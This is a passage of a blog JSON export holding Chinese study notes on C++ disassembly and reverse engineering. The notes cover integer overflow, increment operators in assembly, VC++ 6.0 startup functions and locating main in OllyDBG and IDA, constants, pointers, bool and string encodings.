)，我们来研究一下这个 -M : -M &#x3D; - ( 2n &#x2F; o ) &#x3D; ( 2n &#x2F; o ) ( 求补 ) 而更深奥的方面我们在这就不研究了 除法优化的原则其实，我们通过还原所得的数都是近似值，这说明给出的公式不够严格，我们要在稍稍深度学习除法运算再来探索这方面的原理 我们可以先不管如何证明的，先看一下为什么还原的除数近似而不等的原因：我们的 Magic Number 是整数值，而 ( 2n &#x2F; o ) 是实数值，所以我们要找到 Magic Number 表达式中 2n 的值才行 3.1.2 算术结果溢出其实我们在之前已经接触过算术结果溢出的相关知识，比如 int 类型的数据如果经过计算后超出了 int 类型的存储范围，超出的部分也就是溢出数据，将无法被保存。又比如说一个负数，溢出后由于表示符号的最高位被进位了，原来符号位上的 1 变成了 0，这是负数也就变成了正数。 不过，我们需要知道，溢出的部分丢失后不是说它就是最大的数了，而是变成了一个很小的数，所以，有一些循环看似死循环，其实有可能并不是死循环，我们来看一下下面的例子： 1234for(int i = 1 ; i &gt; 0 ; i++)&#123; std::cout &lt;&lt; i;&#125; 上面的 for 循环看上去是一一个死循环，但由于 i 是一个有符号数，当 i 等于它允许取得的最大正数值0x7FFFFFF 时，再次加 1 后，数值会产生进位，将符号位 0 修改为 1，最终结果为 0x80000000，这时的最高位为 1,按照有符号数进行解释，这便是一个负数，对于 for 循环而言，当循环条件为假时，则会跳出循环体，结束循环。 溢出是由于数据进位后超出数据的保存范围导致的。溢出和进位都表示数据超出了存储范围，它们之间又有什么区别呢? 进位： 无符号数超出存储范围叫做进位。因为没有符号位，所以不会破坏数据，而多出的1位数据会被进位标志位 CF 保存，数据产生了进位，只是进位后的 1 位数据 1 不在自身的存储空间中，而在标志位 CF 中，可通过查看进位标志位 CF，检查数据是否进位。 溢出： 有符号数超出存储范围叫做溢出，由于数据进位，从而破坏了有符号数的最高位一符号位，因为只有有符号数才有符号位，所以溢出只针对有符号数。可查看溢出标志位 OF，检查数据是否溢出。OF 的判定规则很简单，如果参与加法计算的数值符号一致，而计算结果符号不同，则判定 OF 成立，其他都不成立。 3.1.3 自增与自减我们知道，C&#x2F;C++ 中分别用 ‘ ++ ‘，’ - - ‘ 来表示自增和自减。而自增和自减有两种： 先递增(减)：先执行自增(减)，然后再执行语句块 后递增(减)：先执行语句块，然后再执行自增(减) 下面我们要研究的是在汇编语言中自增和自减是怎么执行的 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.1 算术运算和赋值&#x2F;image-6.png) ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-3.1 算术运算和赋值&#x2F;image-5.png) 通过上面的汇编我们可以清晰的知道自增和自减是如何运作的： 先递增是将原语句块”number_two &#x3D; 5 + (++number_one);”分解为”number_one +&#x3D; 1 ;”和”number_two&#x3D; 5 +number_one;”，这样就实现了先自增 1，再参与语句块运算。同理，后递增的拆分过程只是执行顺序做了替换，先参与表达式运算，再将自身加 1。在识别过程中，后递增必然会保存计算前的变量值，在表达式计算完成后，才取出之前的值加 1，这是个显著特点。","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"3、观察各种表达式的求值过程","slug":"C-反汇编与逆向分析技术揭秘/3、观察各种表达式的求值过程","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/3%E3%80%81%E8%A7%82%E5%AF%9F%E5%90%84%E7%A7%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E6%B1%82%E5%80%BC%E8%BF%87%E7%A8%8B/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-2.3main函数的识别","slug":"C++反汇编与逆向分析技术揭秘-2.3 main函数的识别","date":"2023-10-31T09:26:14.000Z","updated":"2023-10-31T09:54:39.761Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-2.3 main函数的识别/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-2.3%20main%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/","excerpt":"","text":"2.3 main函数的识别通过上节的学习，我们知道了调用main函数之前，必须先要得到三个必要的参数，而这三个参数的获取我们应该已经了解了，那么我们来看看怎么识别main函数： 首先，main函数被调用前要先调用下面的函数： GetVersion() heap init() GetCommandLineA0 _crtGetEnvironmentStringsA() _setargv() _setenvp() _cinit() 这些函数被调用之后，就会开始调用main函数。根据main函数被调用的特性，会将三个参数压入栈中作为函数的参数，那么我们只要知道以上函数到哪里截止就好了 2.3.1 OllyDBGOllyDBG在加载程序时直接暂停在应用程序的人口处，而不会直接定位到main函数处，需要分析者手动查找定位，我们可以通过main函数的特性查找到所在的位置 识别出GetCommandLineA()函数后，对应前面讨论的main函数特性继续寻找。为了准确识别main函数，可以观察传递参数的个数，如果具有3个参数，便是main函数的调用，双击即可进入main函数的实现中 2.3.2 IDAIDA下的main函数识别更为简便，它会直接分析出main函数所在的位置并显示出来（虽然有的程序放在IDA中是显示没有main函数的）那么，如何使用IDA分析启动函数mainCRTStartup呢？只要在函数窗口(左栏)中找到mainCRTStartup所在的位置，双击便可进入函数实现中 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-2.3 main函数的识别&#x2F;image-46-1024x549.png)","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"2、认识启动函数，找到用户入口","slug":"C-反汇编与逆向分析技术揭秘/2、认识启动函数，找到用户入口","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/2%E3%80%81%E8%AE%A4%E8%AF%86%E5%90%AF%E5%8A%A8%E5%87%BD%E6%95%B0%EF%BC%8C%E6%89%BE%E5%88%B0%E7%94%A8%E6%88%B7%E5%85%A5%E5%8F%A3/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-2.2了解启动程序","slug":"C++反汇编与逆向分析技术揭秘-2.2 了解启动程序","date":"2023-10-31T09:25:33.000Z","updated":"2023-10-31T09:37:24.470Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-2.2 了解启动程序/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-2.2%20%E4%BA%86%E8%A7%A3%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"2.2 了解启动程序> 需要注意的是，本篇将以VC++ 6.0作为示例，而其他C++的编译器与其差异不大，我们可以用自己的编译器实际操作一下 VC++ 6.0在控制台和多字节编码环境下的启动函数为mainCRTStartup，由系统库KERNEL32.dll负责调用。在mainCRTStartup中再调用main函数。使用VC++ 6.0进行调试时，入口断点总是停留在main函数的首地址处。如何挖掘main函数之前的代码呢？我们可以利用VC++ 6.0的栈回溯功能。在调试环境下，依次选择菜单View→Debug Windows→Call Stack打开出栈窗口(快捷键: Alt+7) 通过实践，我们可以知道，程序运行时调用了三个函数，依次是KERNEL32、mainCRTStartup 和main。其中显示的”KERNEL32 ! 7c817077” 表示在系统库KERNEL32.d11中的地址7c817077处调用mainCRTStartup,我们无法查看KERNEL32.dIl的高级源码，而VC++则提供了mainCRTStartup函数的源码，安装完整版VC++就可以查看。双击CallStack窗口中的mainCRTStartup函数，查看函数的内部实现 接下来，我们需要了解一些启动函数的工作流程： GetVersion函数：获取当前运行平台的版本号。控制台程序运行在Windows模拟的DOS下，因此这里获取的版本号为MS-DOS的版本信息。 _ heap_ init 函数：用于初始化堆空间。在函数实现中使用HeapCreate申请堆空间，申请空间的大小由_ heap_ init 传递的参数决定。_ sbh heap init 函数用于初始化堆结构信息。堆结构的说明将在第7章详细讲解。 GetCommandLineA函数：获取命令行参数信息的首地址。 _ crtGetEnvironmentStringsA 函数：获取环境变量信息的首地址。 _ setargv函数：此函数根据GetCommandLineA获取命令行参数信息的首地址并进行 参数分析，将分离出的参数的个数保存在全局变量**_argc** 中，将分析出的每个命令行 参数的首地址存放在数组中，并将这个字符指针数组的首地址保存在全局变量**argv **中。这样就得到了命令行参数的个数，以及命令行参数信息。 setenvp 函数：此函数根据_ _crtGetEnvironmentStringsA 函数获取环境变量信息的首地址并进行分析，将得到的每条环境变量字符串的首地址存放在字符指针数组中，并将这个数组的首地址存放在全局变量env中。 这就会得到main函数所需要的三个参数，所以当调用main函数的时候，便将**argc**** ，**_argv ，_env 这三个全局变量作为参数，以栈传参的方式传递到main函数中 接下来我们还要认识一个函数： _cinit 函数：用于全局数据和浮点寄存器的初始化。全局对象和IO流的初始化都是通过这个函数实现的。利用函数_initterm进行数据链初始化，这个函数由两个参数组成，类型为”_PVFV*”，这是一个函数指针数组，其中保留了每个初始化函数的地 址。初始化函数的类型为 PVFV, 其定义原型如下: typedef void ( cdecl *_PVFV) (void) ; 也就是说，这个初始化函数是无参数也无返回值的。大家知道，C++ 规定全局对象和静态对象必须在main函数前构造，在main函数返回后析构。所以，这里的_PVFV函数指针数组就是用来代理调用构造函数的 那么，是不是所有由VC++编译出的控制台程序的启动函数都在mainCRTStartup中呢？这要根据编译选项确定。在默认情况下，人口函数为main，这时会从mainCRTStartup启动，再传入main所需要的三个参数，最后调用main函数。重新指定入口函数后，将直接从KERNEL32中调用重新指定的入口函数，而不会经过mainCRTStartup。通过修改编译选项，重新设置入口函数，依次选择菜Procject→Settings→Link→Output,在Enty-pointsymbol中填写需要重新指定新入口的函数名称 但是，如果没有经过mainCRTStartup，而直接调用的新的入口函数，所以堆空间是没有被初始化的，这么做的话，在使用到堆空间的时候，程序会报错并且崩溃","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"2、认识启动函数，找到用户入口","slug":"C-反汇编与逆向分析技术揭秘/2、认识启动函数，找到用户入口","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/2%E3%80%81%E8%AE%A4%E8%AF%86%E5%90%AF%E5%8A%A8%E5%87%BD%E6%95%B0%EF%BC%8C%E6%89%BE%E5%88%B0%E7%94%A8%E6%88%B7%E5%85%A5%E5%8F%A3/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-2.1程序的真正入口","slug":"C++反汇编与逆向分析技术揭秘-2.1 程序的真正入口","date":"2023-10-31T09:17:07.000Z","updated":"2023-10-31T09:37:19.708Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-2.1 程序的真正入口/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-2.1%20%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%85%A5%E5%8F%A3/","excerpt":"","text":"2.1 程序的真正入口VC++开发的程序，在调试时总是从main或WinMain函数开始，这就让我们误认为它们是程序的第一条指令执行的地方，这个认识其实是不对的。 其实呢，main 或WinMain也是一个函数，也需要有一个调用者。在它们被调用前，编译器其实已经做了很多事情，所以我们熟悉的main或WinMain应该是”语法规定的用户入口”，而不是”应用程序入口”。在应用程序被操作系统加载的时候，操作系统会分析执行文件内的数据，并且将相关资源都分配出去，再读取执行文件中的代码和数据到合适的内存单元，然后才是执行入口代码，入口代码其实并不是我们熟悉的main或WinMain,通常是mainCRTStartup、wmainCRTStartup、 WinMainCRTStartup 或wWinMainCRTStartup，具体视编译选项而定。 其中，mainCRTStarup和wmainCRTStartup是控制台环境下多字节编码和Unicode编码的启动函数，而WinMainCRTStartup和wWinMainCRTStartup则是Windows环境下多字节编码和Unicode编码的启动函数。在开发过程中，VC++也允许程序员自己指定人口。","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"2、认识启动函数，找到用户入口","slug":"C-反汇编与逆向分析技术揭秘/2、认识启动函数，找到用户入口","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/2%E3%80%81%E8%AE%A4%E8%AF%86%E5%90%AF%E5%8A%A8%E5%87%BD%E6%95%B0%EF%BC%8C%E6%89%BE%E5%88%B0%E7%94%A8%E6%88%B7%E5%85%A5%E5%8F%A3/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-1.6常量","slug":"C++反汇编与逆向分析技术揭秘-1.6 常量","date":"2023-10-31T09:11:33.000Z","updated":"2023-10-31T09:54:23.931Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-1.6 常量/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-1.6%20%E5%B8%B8%E9%87%8F/","excerpt":"","text":"1.6 常量常量和变量不同，变量可以随时改变，在程序运行中可以修改其保存的值；而常量呢，顾名思义，就是一个恒定不变的值，它在内存中也是不可修改的。比如说在程序中见到1、2、3这样的数字，或者是”Hello”这样的字符串，还有数组名称等等，这些都属于常量。程序在运行中是不可以修改它们的数据的 而常量是在程序运行前就已经存在了的，它们被编译到可执行文件中。当程序启动后，它们便会被加载进来。这些数据通常都会在常量数据库中保存，这个区域的属性中是没有可写权限的，所以当你试图对常量进行修改的时候，程序都会报错，引发异常，严重时将会导致程序崩溃 常量数据的地址减去基地址，便是它们的偏移地址 1.6.1 常量的定义在C++中，有两种方式定义常量： 可以用宏机制#define来定义常量 也可以用const将变量定义为一个常量 #define定义的常量名称，编译器对其进行编译时，会将代码中的宏名称替换成对应的信息，宏的使用可以增加代码的可读性 比如我们宏定义了一个常量number_one，并定义其的值为99，所以程序将其输出时，输出得到的结果就是99。而const是为了增加程序的健壮性而存在的 ![](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-1.6 常量&#x2F;image-31.png) 这里我们将宏定义的常量number_one的值，也就是99，赋值给了const常量number_two，所以最后输出得到的结果也是99 1.6.2 #define 与 const 的区别#define是一个真常量，而const却是由编译器判断实现的常量，是一个伪常量。实际中，使用const定义的变量，最终还是一个变量，只是在编译器内进行了检查，发现有修改则报错 由于编译器在编译期间对const进行检查，因此被const修饰过的变量是可以被修改的。利用指针获取到const修饰过的变量地址，强制将指针的const修饰去掉，就可以修改对应的数据内容 1.6.3 关于这两者在连接生成可执行文件后将不复存在，在二进制编码中也没有这两种类型存在，在实际分析中，我们需要根据自身的经验进行分析还原","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"1、基本数据类型的表现形式","slug":"C-反汇编与逆向分析技术揭秘/1、基本数据类型的表现形式","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-1.5地址","slug":"C++反汇编与逆向分析技术揭秘-1.5 地址、指针和引用","date":"2023-10-31T09:09:46.000Z","updated":"2023-10-31T09:37:09.829Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-1.5 地址、指针和引用/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-1.5%20%E5%9C%B0%E5%9D%80%E3%80%81%E6%8C%87%E9%92%88%E5%92%8C%E5%BC%95%E7%94%A8/","excerpt":"","text":"1.5 地址、指针和引用首先我们先来初步了解一下什么时是地址和指针，还有引用 地址：在C++中，地址标号用十六进制表示，如果我们想取一个变量的地址，那么就需要用到”&amp;”符号。但我们需要知道，只有变量才有地址，而常量是没有地址的（当然，我们不将const定义的伪常量包括在内），例如数字100，我们是无法取出它的地址的。取出的地址是一个常量值，我们就无法再对其取地址了。 指针：指针的定义使用”TYPE“,TYPE指的是数据类型，比如说 int，char*……所以任何数据类型都可以定义指针。实际上，指针本身就是一种数据类型，它用来保存各种数据类型在内存中的地址。因为指针本身就是变量，所以是可以对指针变量取地址的，所以会出现多级指针 引用：**引用的定义用”TYPE&amp;”**，TYPE指得是数据类型。在C++中是不可以单独定义的，并且在定义的时候就要进行初始化。引用表示一个变量的别名，对它的任何操作，本质上都是在操作它所表示的变量 1.5.1 地址和指针的区别指针可以通过指针类型对其地址对应的数据进行解释，而一个地址值无法单独解释数据 由于指针保存的数据都是地址，所以无论什么类型的指针在内存中都占用4个字节 下表是指针与变量不同点： 指针地址本身是变量，用于保存变量地址本身是常量，内存标号可修改，再次保存其他变量的地址不可修改可对其执行取地址操作得到地址不可对其执行取地址操作包含对保存的地址的解释信息一个地址值无法单独解释数据**指针与地址之间的不同点** 下表是指针与变量共同点： 指针地址可以取出指向地址内存中的数据可以取出地址对应内存中的数据可以对地址偏移后，再取数据可以偏移后取数据，自身不变可以求两个地址的差可以求两个地址的差 ## 1.5.2 各类型指针的工作方式 在C++中，任何数据类型都有对应的指针类型。从前面的学习中了解到，指针中保存的都是地址，为什么还需要类型作为修饰呢?因为需要用类型去解释这个地址中的数据。每种数据类型在内存中所占的内存空间不同，指针中只保存了存放数据的首地址，而没有指明该在哪里结束。这时就需要根据对应的类型来寻找解释数据的结束地址。例如，同一地址，使用不同类型指针进行访问，取出的内容就会不一样 指针的取内容操作分为两个步骤：先取出指针中保存的地址信息，然后针对这个地址进行取内容，也就是一个间接寻址的过程，这也是识别指针的重要依据 我们需要知道：所有类型的指针对地址的解释都取自于自身指针类型 那么指针支持哪些运算符号呢？在C++中，所有指针类型只支持加减法。指针是永远保存数据的地址、解释地址而存在的。因此，只有加减法才是有意义的，而乘除法是没有意义的 指针的加减法用于地址偏移，但指针的加减法并不像数学中的加减法那样简单。比如说，指针加1后，指针内保存的地址值并不一定会加1，具体的值取决于指针类型，若指针类型为int，指针加1后地址值将会加4。这个4是根据数据类型大小所得到的值。所以说用数据类型去修饰指针是很重要的。 但是，为什么C++要用这种繁琐的地址偏移方法呢，为什么不让加1就是加1呢？这是因为指针中保存的地址为数据的首地址，如果数据类型为数组，为了能够利用指针加1后直接访问到数组内下一成员，所以加的是类型长度，而非数字1 两指针做减法操作，是在计算两个地址之间的元素个数，结果为有符号整数，进行减法操作的两指针必须是同类指针 指针的减法可用于其中地址的比较，也可用于其他场合，比如求数组元素的个数（用两指针相减得到地址的差除以数据类型的大小即可得到数组元素的个数） 另外，两指针相加也是没有意义的 当然，在能够灵活运用指针的同时，指针的运用也要谨慎，以免将指针指向意料之外的地址，错误地修改地址中的数据，造成程序的崩溃 1.5.3 引用引用类型在C++中被描述为变量的别名。实际上，C++为了简化指针操作，对指针操作进行了封装，这就产生了引用类型。其实呢，引用类型就是指针类型，只不过它用于存放地址的内存空间对使用者来说是隐藏的。 引用类型的存储方式和指针是一样的，都是使用内存空间存放地址值。所以在C++中，引用和指针没有区别，只是引用时通过编译器实现寻址，而指针需要手动寻址。指针虽然灵活，但操作失误将造成严重后果，而使用引用则不存在这种问题。因此，C++极力推荐使用引用类型 在汇编代码中，如果没有源码对战，指针和应用都一样难以区分。 不过值得庆幸的时，在反汇编中，没有引用 这种数据类型","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"1、基本数据类型的表现形式","slug":"C-反汇编与逆向分析技术揭秘/1、基本数据类型的表现形式","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-1.4布尔类型","slug":"C++反汇编与逆向分析技术揭秘-1.4 布尔类型","date":"2023-10-31T09:08:07.000Z","updated":"2023-10-31T09:37:04.303Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-1.4 布尔类型/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-1.4%20%E5%B8%83%E5%B0%94%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"1.4 布尔类型1.4.1 布尔类型的介绍布尔类型很简单，只有 0 与 非0 两种情况，在C++中，0 则表示为假，非0 则表示为真，并且是用bool定义布尔类型变量。布尔类型变量在内存中占一个字节，无论输入给布尔类型变量怎么样的数，只要非0就解释为1，即真，只要是0，就解释为0，即假。 现在我们知道，布尔类型的出现都是用来判断的，所以，它只是一个比较方便的工具，但实际上，任何类型都可以代替它的作用，比如说整型，浮点数，甚至是字符串或者位。 布尔类型的输出值只有1和0（即真和假）两种，所以布尔类型很好理解和学习，但布尔类型非常的重要，在代码中如果遇到布尔类型的运用，我们要能够将其转变为我们能理解的等价代码与解释。 例如下面的代码： 12345678910111213141516171819#include&lt;iostream&gt;int main()&#123; //我们可以用布尔类型来判断用户输入的数是否是零 using namespace std; bool judgment; int num; cout &lt;&lt; &quot;Please input num&quot;; cin &gt;&gt; num; judgment = num; if (!judgment) &#123; cout &lt;&lt; &quot;This is zero!&quot;; &#125; else &#123; cout &lt;&lt; &quot;This is not zero!&quot;; &#125;&#125; 当然我们一般不这么判断，我们知道，直接将if 语句的条件句改为 num &#x3D;&#x3D; 0 就好了，还不用定义布尔类型的judgment。实际上确实如此，但是其实 num &#x3D;&#x3D; 0 这一句就是 ！judgment 的等价代码，而前者更容易被人理解，而后者看似简短但需要仔细琢磨一下。 虽然我们自己写代码的时候可以用最好理解的方式写代码，但是其他方式写出来的我们也能看懂才行❤","categories":[{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"1、基本数据类型的表现形式","slug":"C-反汇编与逆向分析技术揭秘/1、基本数据类型的表现形式","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F/"}],"tags":[]},{"title":"C++反汇编与逆向分析技术揭秘-1.3字符和字符串","slug":"C++反汇编与逆向分析技术揭秘-1.3 字符和字符串","date":"2023-10-31T09:07:23.000Z","updated":"2023-10-31T09:54:02.668Z","comments":true,"path":"2023/10/31/C++反汇编与逆向分析技术揭秘-1.3 字符和字符串/","link":"","permalink":"http://example.com/2023/10/31/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98-1.3%20%E5%AD%97%E7%AC%A6%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"1.3 字符和字符串字符串是由一个个字符组成的，而每个字符在字符表中又各自对应着一个唯一的编号。系统通过这些编号在表中查找这些字符，并把它们显示出来。其实，字符表格中的编号就是字符的编码格式。 1.3.1字符的编码在C++中，字符的编码格式有两种，分别是ASCII和Unicode 其中，Unicode是ASCII码的升级版，它弥补了ASCII的不足，在《C++反汇编与逆向分析技术揭秘》中说到，Unicode也是未来编码格式的趋势。 1.3.1.1 ASCII在C++中，ASCII编码在内存中占用一个字节，每个编号表示一个字符，它的表示范围为0~255。而且，ASCII码是可以和整型相互转换的，但是要注意不能超过ASCII码所能表示的最大范围，因为多余的部分将会被舍弃。 一般的，使用char定义ASCII编码格式的字符，如字符’a’可以转换为十六进制的0x61，或者是十进制的97 更多的ASCII码可以搜索ASCII表进行对照 ![ASCII字符代码表](&#x2F;images&#x2F;C++反汇编与逆向分析技术揭秘-1.3 字符和字符串&#x2F;image-23.png) 1.3.1.2 Unicode由于ASCII所能表示的范围太小，只能表示26个英文字母的大小写和一些常用字符，不同于ASCII，Unicode是占用两个字节的，它的表示范围为0～65535，当然，ASCII也包含在其中 一般的，用wchar_t定义Unicode编码格式的字符。像是字符’a’，我们知道用ASCII码表示是0x61，而用Unicode保存ASCII码的话是0x0061，这是因为ASCII是占用一个字节的，Unicode是占用两个字节的，所以不足的位就用0来补。 1.3.1.3 汉字的编码ASCII编码和Unicode编码都可以存储汉字，但是它们对汉字的编码方式各不相同，所以存储同样的汉字，它们在内存中的编码是不相同 ASCII两个字节解释一个汉字。在汉字国标码中用区和位来定位，第一个字节保存每个区，共94个区；第二个字节保存每个区中的位，共94位 Unicode使用USC-2编码格式，最多可以存储65535个字符，每个数字编号在表中对应一个汉字，但汉字博大精深，65535个肯定不够用，所以USC-2编码格式中只保存了常用字。而为了将更多的汉字都能表示出来，Unicode采用了和ASCII类似的方法，就是用两个Unicode编码解释一个汉字，称之为USC-4编码格式 1.3.2 字符串的存储方式字符串是由一系列按照一定的编码顺序线性排列的字符组成的。在图形中，两点可以确定一条直线，那么在程序中，只要知道字符串的首地址和结束地址就可以确定字符串的长度和大小。字符串的首地址很容易确定，因为在定义字符串的时候都会先指定好首地址。结束地址如何确定呢?有两种做法，一种是在首地址的4字节中保存字符串的总长度;另一种是在字符串的结尾处使用一个规定好的特殊字符，即结束符。为了更好的理解，我们可以看一下下面的距离： 保存总长度法： 我们知道了这串字符串的首地址，如果我们又知道了这串字符串多长，那么是不是就可以知道这段字符串是到哪里停止了，比如说下面这么一串字符中，如果字符串的第一个字符是4，长度是7，那么我们就可以知道这个字符串就是4567890 “1 2 3 4 5 6 7 8 9 0” 保存结束符法： 我们知道了这串字符串的首地址，如果我们又知道了这串字符串是以什么为结束符的，那么是不是就可以知道这段字符串是到什么了，比如说下面这么一串字符中，如果字符串的第一个字符是2，以’\\0’为结束符，那么我们就可以知道这个字符串就是234 “1 2 3 4 \\0 5 6 7 8 9 0” 当然，这两种方法都有各自的优缺点： 保存总长度： **优点:**获取字符串长度时，不用遍历字符串中的每个字符，取得首地址的前n字节就可以得到字符串的长度。(n 的取值一般是1、2、4)**缺点:**字符串长度不能超过n字节的表示范围，且要多开销n字节空间保存长度。如果涉及通信，双方交互前必须事先知道通信字符串的长度。 保存结束符： **优点:**没有记录长度的开销:另外，如果涉及通信，通信字符串可以根据实际情况随时结束，结束时附上结束符即可。**缺点:**获取字符串长度需要遍历所有字符，寻找特殊结尾字符，在某些情况下处理效率低。 C++使用结束符’\\0’作为字符串结束标志。ASCII 编码使用一个字节’\\0’, Unicode 